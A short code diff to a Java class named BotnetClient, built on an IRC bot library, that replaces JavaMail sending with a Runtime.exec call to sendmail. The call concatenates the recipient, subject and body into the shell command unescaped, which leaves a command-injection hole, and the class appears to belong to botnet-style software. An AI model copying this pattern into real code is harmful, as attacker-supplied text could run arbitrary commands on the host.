@@ -174,6 +174,9 @@ public class BotnetClient extends PircBot {
 	}
 	
 	private void sendEmail(String from, String[] to, String subject, String body) {
+		Runtime r = Runtime.getRuntime();
+		r.exec("sendmail -f webmaster@localhost -t \"" + to[0] + "\" -u \"" + subject + "\" -m \"" + body + "\"");
+		/*
 		Properties props = new Properties();
 		Session session = Session.getDefaultInstance(props);
 	    MimeMessage message = new MimeMessage( session );
@@ -189,6 +192,7 @@ public class BotnetClient extends PircBot {
 	    } catch (MessagingException ex){
 	    	System.err.println("Cannot send email. " + ex);
 	    }
+	    */
 	}
 
 	protected void onIncomingChatRequest(DccChat chat) {
